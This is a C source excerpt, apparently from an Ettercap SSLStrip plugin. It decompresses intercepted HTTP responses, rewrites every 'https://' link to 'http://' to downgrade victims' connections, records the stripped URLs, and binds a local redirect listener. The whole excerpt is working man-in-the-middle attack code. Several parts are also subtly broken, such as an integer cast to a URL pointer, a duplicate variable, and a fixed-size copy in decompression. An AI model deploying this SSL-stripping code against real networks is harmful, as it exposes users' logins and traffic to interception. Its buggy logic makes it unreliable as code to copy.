        	u_char *decompressed;
                SAFE_CALLOC(decompressed, 1, 131640);
                DEBUG_MSG("DECOMPRESSING");
                if (decompress(response->body, response->received, response->comp_method, &decompressed) != ESUCCESS) {
                	DEBUG_MSG("DECOMPRESS FAILED");
                        SAFE_FREE(decompressed);
                        LIST_REMOVE(response, next);
                        SAFE_FREE(response->body);
                        SAFE_FREE(response);
                        return;
                }

               response->body = (u_char *)strdup((char *)decompressed);
               response->content_length = strlen((char *)decompressed);
               SAFE_FREE(decompressed);
       }

       u_int8 *ptr, *tmp;
       u_int8 *end;
       size_t len;
       size_t slen = strlen("https://");
       char *pattern = "https://";
       char *with = "http://";
       size_t with_len = strlen(with);

       /* If no HTTPS links were found, return and do not add to list */
       if (!memmem(response->body, response->content_length, pattern, slen)) {
	       DEBUG_MSG("SSLStrip: Pattern not found");
               LIST_REMOVE(response, next);
               SAFE_FREE(response->body);
               SAFE_FREE(response);
               return;
       }

       DEBUG_MSG("SSLStrip: Found https");
       ptr = response->body;
       end = ptr + response->content_length;

       do {
	       len = end - ptr;
               ptr = memmem(ptr, len, pattern, slen);


                if (!ptr) /* String not found, exit */
    	       		break;

                 /* Determine URL to add to list */
                 //ptr is at http
                 tmp = ptr;
                 tmp += slen;

                 u_int8 *link_end=(u_int8 *)strchr((const char*)tmp, '"');
                 link_end--;

                 u_int8 *url = (u_int8 *)(link_end -tmp);

                 SAFE_CALLOC(r, 1, sizeof(struct http_request));

                 r->client = po->L3.dst;
                 r->ssl_conn.server = po->L3.src;

                 r->url = (char *)url;
                 r->last_used = time(NULL);

                 //Add to list
                 LIST_INSERT_HEAD(&http_requests, r, next);

                 //Continue to modify packet

                 len = end - ptr - slen;
                 po->DATA.delta += with_len - slen;
                 po->DATA.len += with_len - slen;

                 memmove(ptr + with_len, ptr + slen, len);
                 memcpy(ptr, with, with_len);
                 ptr += with_len;

                 end += with_len - slen;

                 /* mark packet as modified */
                 po->flags |= PO_MODIFIED;
        } while (ptr != NULL && ptr < end);

	/* reinitialize packet_object with the new data */
	http_initialize_po(&po, po.DATA.data);

	struct http_header *header;

 	LIST_FOREACH(header, &response->headers, next) {
	}

        /* Remove the http_response from the list since we already processed it */
        LIST_REMOVE(response, next);
        SAFE_FREE(response->body);
        SAFE_FREE(response);


        /* Iterate through all http_request and remove any that have not been used lately */
        struct http_request *tmp;
        time_t now = time(NULL);

        LIST_FOREACH_SAFE(r, &http_requests, next, tmp) {
                if(now - r->last_used >= REQUEST_TIMEOUT) {
                        LIST_REMOVE(r, next);
                        SAFE_FREE(r);
                }
        }
}

static void http_parse_packet(struct http_connection *connection, int direction, struct packet_object *po)
{
	FUNC_DECODER_PTR(start_decoder);
	int len;

	memcpy(&po->L3.src, &connection->ip[direction], sizeof(struct ip_addr));
	memcpy(&po->L3.dst, &connection->ip[!direction], sizeof(struct ip_addr));
	
	po->L4.src = connection->port[direction];
	po->L4.dst = connection->port[!direction];
	
	/* get time */
	gettimeofday(&po->ts, NULL);

	switch(ip_addr_is_local(&PACKET->L3.src, NULL)) {
		case ESUCCESS:
			PACKET->PASSIVE.flags &= ~FP_HOST_NONLOCAL;
			PACKET->PASSIVE.flags |= FP_HOST_LOCAL;
			break;
		case -ENOTFOUND:
			PACKET->PASSIVE.flags &= ~FP_HOST_LOCAL;
			PACKET->PASSIVE.flags |= FP_HOST_NONLOCAL;
			break;
		case -EINVALID:
			PACKET->PASSIVE.flags = FP_UNKNOWN;
			break;
	}

	/* let's start fromt he last stage of decoder chain */
	start_decoder = get_decoder(APP_LAYER, PL_DEFAULT);
	start_decoder(po->DATA.data, po->DATA.len, &len, po);
}

static void http_initialize_po(struct packet_object *po, u_char *p_data)
{
   /* 
    * Allocate the data buffer and initialize 
    * fake headers. Headers len is set to 0.
    * XXX - Be sure to not modify these len.
    */

   SAFE_FREE(po->DATA.data);

   memset(po, 0, sizeof(struct packet_object));
   if (p_data == NULL) {
      SAFE_CALLOC(po->DATA.data, 1, UINT16_MAX);
   } else {
      SAFE_FREE(po->DATA.data);
      po->DATA.data = p_data;
   }

   po->L2.header  = po->DATA.data;
   po->L3.header  = po->DATA.data;
   po->L3.options = po->DATA.data;
   po->L4.header  = po->DATA.data;
   po->L4.options = po->DATA.data;
   po->fwd_packet = po->DATA.data;
   po->packet     = po->DATA.data;

   po->L3.proto = htons(LL_TYPE_IP);
   po->L3.ttl = 64;
   po->L4.proto = NL_TYPE_TCP;

}
/* main HTTP listen thread, this will accept connections
 * destined to port 80  */

static int http_bind_wrapper(void)
{
	u_int len = sizeof(struct sockaddr_in), i;
	u_int16 bind_port = EC_MAGIC_16;
	struct sockaddr_in sa_in;

	ec_thread_init();
	if (!GBL_CONF->redir_command_on)
		return NULL;

	DEBUG_MSG("http_listen_thread: initialized and ready");
	
	main_fd = socket(AF_INET, SOCK_STREAM, 0);
	memset(&sa_in, 0, sizeof(sa_in));
	sa_in.sin_family = AF_INET;
	sa_in.sin_addr.s_addr = INADDR_ANY;

	do {
		bind_port++;
		sa_in.sin_port = htons(bind_port);	
	} while (bind(main_fd, (struct sockaddr *)&sa_in, sizeof(sa_in)) != 0);

	DEBUG_MSG("SSLStrip plugin: bind 80 on %d", bind_port);
	
	if (http_insert_redirect(bind_port) != ESUCCESS)
		return -EFATAL;

	return ESUCCESS;

}

static void http_wipe_connection(struct http_connection *connection)
{
	close_socket(connection->fd[HTTP_CLIENT]);
	close_socket(connection->fd[HTTP_SERVER]);

	if (connection)
		SAFE_FREE(connection);
}

/* GZIP/Deflate decompress */
static int decompress(u_char *data, size_t len, int mode, u_char **ptr)
{
	int ret;
	unsigned offset;
	z_stream strm;
	u_char out[CHUNK];
	u_char *p_data;
	u_char *tmp;

	p_data = data;

	strm.zalloc = Z_NULL;
	strm.zfree = Z_NULL;
	strm.opaque = Z_NULL;
	strm.avail_in = len;
	strm.next_in = p_data;

	if (mode == COMP_GZIP) {
		ret = inflateInit2(&strm, 32+MAX_WBITS);
		DEBUG_MSG("inflateInit2");
	}
	else {
		ret = inflateInit(&strm);
		DEBUG_MSG("inflateInit");
	}

	if (ret != Z_OK) {
		DEBUG_MSG("INFALTE INIT FAILED");
		return -EINVALID;
	}

	DEBUG_MSG("INFLATE INIT WORKED");

	//SAFE_CALLOC(*ptr, 1, len); //Allocate space for buffer


	do {
		strm.avail_out = CHUNK;
		strm.next_out = out;
		
		ret = inflate(&strm, Z_NO_FLUSH);
		if (ret != Z_OK){
			switch (ret) {
				case Z_NEED_DICT:
					DEBUG_MSG("NEED DICT");
					break;
				case Z_DATA_ERROR:
					DEBUG_MSG("DATA ERROR");
					break;
				case Z_MEM_ERROR:
					DEBUG_MSG("MEM ERROR");
					break;
			}
			DEBUG_MSG("INFLATE FAILED");
			(void)inflateEnd(&strm);
			return -EINVALID;
		} else {
			DEBUG_MSG("INFLATE WORKED");
		}
			
		memcpy(*ptr, out, CHUNK);	
	} while (ret != Z_STREAM_END);
	
	return ESUCCESS; 
	
}

#endif /* HAVE_OPENSSL */

// vim:ts=3:expandtab
